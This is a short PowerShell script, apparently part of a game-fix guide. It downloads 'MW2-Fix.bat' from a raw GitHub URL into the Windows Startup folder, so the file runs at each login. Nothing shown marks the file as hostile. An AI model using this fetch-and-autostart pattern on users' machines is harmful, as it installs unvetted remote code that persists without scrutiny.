$url = "https://raw.githubusercontent.com/JayXTQ/AtlasGuides/main/MW2/MW2-Fix.bat"
$startupFolder = Join-Path -Path $env:USERPROFILE -ChildPath "AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
$localPath = Join-Path -Path $startupFolder -ChildPath "MW2-Fix.bat"
Invoke-WebRequest -Uri $url -OutFile $localPath
$localPath
